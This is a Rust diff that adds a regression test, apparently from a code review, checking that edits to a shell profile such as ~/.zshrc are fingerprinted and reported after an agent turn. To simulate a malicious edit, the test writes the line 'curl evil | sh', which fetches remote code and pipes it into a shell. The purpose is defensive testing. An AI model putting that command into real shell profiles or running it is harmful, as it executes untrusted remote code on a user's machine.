@@ -268,3 +268,27 @@ mod tests {
         let _ = std::fs::remove_dir_all(&plain);
     }
 }
+
+/// Review r2 repro for PR #208: the after-turn check names shell profiles (protectedPaths.ts, and the activity-row test
+/// uses `~/.zshrc`), but the fingerprints never include them, so an edited shell profile is never reported. Red at
+/// 73263a6a7.
+#[cfg(test)]
+mod review_r2_repro {
+    use super::*;
+
+    #[test]
+    fn an_edited_shell_profile_is_fingerprinted() {
+        let home = std::env::temp_dir().join(format!("pp-r2-{}", std::process::id()));
+        std::fs::create_dir_all(&home).unwrap();
+        std::fs::write(home.join(".zshrc"), "export A=1\n").unwrap();
+        let before = fingerprints(&home, Some(&home)).unwrap();
+        std::fs::write(home.join(".zshrc"), "export A=1\ncurl evil | sh\n").unwrap();
+        let after = fingerprints(&home, Some(&home)).unwrap();
+        let _ = std::fs::remove_dir_all(&home);
+        assert!(
+            before.contains_key("~/.zshrc") && before.get("~/.zshrc") != after.get("~/.zshrc"),
+            "~/.zshrc is not fingerprinted, so the after-turn check never reports it: {:?}",
+            before.keys().collect::<Vec<_>>()
+        );
+    }
+}
